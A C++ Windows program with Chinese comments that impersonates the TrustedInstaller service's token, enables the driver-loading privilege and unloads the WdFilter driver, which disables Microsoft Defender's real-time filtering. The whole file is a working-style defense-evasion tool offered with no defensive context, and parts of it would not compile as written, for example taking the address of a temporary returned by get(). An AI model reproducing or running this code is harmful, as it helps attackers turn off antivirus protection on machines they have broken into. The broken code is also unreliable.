#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>
#include <memory>

class Handle {
public:
    explicit Handle(HANDLE handle) : m_handle(handle) {}
    ~Handle() {
        if (m_handle != INVALID_HANDLE_VALUE) {
            CloseHandle(m_handle);
        }
    }

    HANDLE get() const {
        return m_handle;
    }

private:
    HANDLE m_handle;
};

class ScHandle {
public:
    explicit ScHandle(SC_HANDLE handle) : m_handle(handle) {}
    ~ScHandle() {
        if (m_handle != nullptr) {
            CloseServiceHandle(m_handle);
        }
    }

    SC_HANDLE get() const {
        return m_handle;
    }

private:
    SC_HANDLE m_handle;
};

DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD processId = 0;
    Handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));

    if (snapshot.get() != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(snapshot.get(), &processEntry)) {
            do {
                if (std::wstring(processEntry.szExeFile) == processName) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot.get(), &processEntry));
        }
    }
    return processId;
}

bool EnablePrivilege(HANDLE token, const std::wstring& privilegeName, bool enable) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(nullptr, privilegeName.c_str(), &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        return false;
    }

    return GetLastError() == ERROR_SUCCESS;
}

int main() {
    // 1. 加载ntdll.dll，并解析NtImpersonateThread和NtUnloadDriver函数地址
    HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
    if (!hNtDll) {
        std::cerr << "Error: Cannot load ntdll.dll" << std::endl;
        return 1;
    }

    auto NtImpersonateThread = reinterpret_cast<NTSTATUS(NTAPI*)(HANDLE, HANDLE, PSECURITY_QUALITY_OF_SERVICE)>(GetProcAddress(hNtDll, "NtImpersonateThread"));
    auto NtUnloadDriver = reinterpret_cast<NTSTATUS(NTAPI*)(PUNICODE_STRING)>(GetProcAddress(hNtDll, "NtUnloadDriver"));

    if (!NtImpersonateThread || !NtUnloadDriver) {
        std::cerr << "Error: Cannot find required functions in ntdll.dll" << std::endl;
        return 1;
    }

    // 2. 启动TrustedInstaller服务及其进程，获取该进程的令牌
    ScHandle scManager(OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT));
    if (!scManager.get()) {
        std::cerr << "Error: Cannot open SC Manager" << std::endl;
        return 1;
    }
    ScHandle tiService(OpenService(scManager.get(), L"TrustedInstaller", SERVICE_START | SERVICE_QUERY_STATUS));
    if (!tiService.get()) {
        std::cerr << "Error: Cannot open TrustedInstaller service" << std::endl;
        return 1;
    }

    if (!StartService(tiService.get(), 0, nullptr)) {
        DWORD lastError = GetLastError();
        if (lastError != ERROR_SERVICE_ALREADY_RUNNING) {
            std::cerr << "Error: Cannot start TrustedInstaller service" << std::endl;
            return 1;
        }
    }

    DWORD tiProcessId = 0;
    while ((tiProcessId = GetProcessIdByName(L"TrustedInstaller.exe")) == 0) {
        Sleep(100);
    }

    Handle tiProcess(OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, tiProcessId));
    if (!tiProcess.get()) {
        std::cerr << "Error: Cannot open TrustedInstaller process" << std::endl;
        return 1;
    }

    Handle tiToken;
    if (!OpenProcessToken(tiProcess.get(), TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &tiToken.get())) {
        std::cerr << "Error: Cannot open TrustedInstaller token" << std::endl;
        return 1;
    }

    // 3. 取得TrustedInstaller的进程令牌，使当前线程获得TrustedInstaller特权
    Handle impersonationToken;
    if (!DuplicateToken(tiToken.get(), SecurityImpersonation, &impersonationToken.get())) {
        std::cerr << "Error: Cannot duplicate TrustedInstaller token" << std::endl;
        return 1;
    }

    if (!SetThreadToken(nullptr, impersonationToken.get())) {
        std::cerr << "Error: Cannot set thread token to TrustedInstaller token" << std::endl;
        return 1;
    }

    // 4. 通过开启SeLoadDriverPrivilege，调用NtUnloadDriver函数卸载Wdfilter驱动
    Handle currentThreadToken;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES, FALSE, &currentThreadToken.get())) {
        std::cerr << "Error: Cannot open current thread token" << std::endl;
        return 1;
    }

    if (!EnablePrivilege(currentThreadToken.get(), SE_LOAD_DRIVER_NAME, true)) {
        std::cerr << "Error: Cannot enable SeLoadDriverPrivilege" << std::endl;
        return 1;
    }

    UNICODE_STRING driverServiceName;
    RtlInitUnicodeString(&driverServiceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
    NTSTATUS status = NtUnloadDriver(&driverServiceName);

    if (!NT_SUCCESS(status)) {
        std::cerr << "Error: Cannot unload Wdfilter driver, NTSTATUS: " << std::hex << status << std::endl;
        return 1;
    }

    std::cout << "Wdfilter driver unloaded successfully." << std::endl;
    return 0;
}

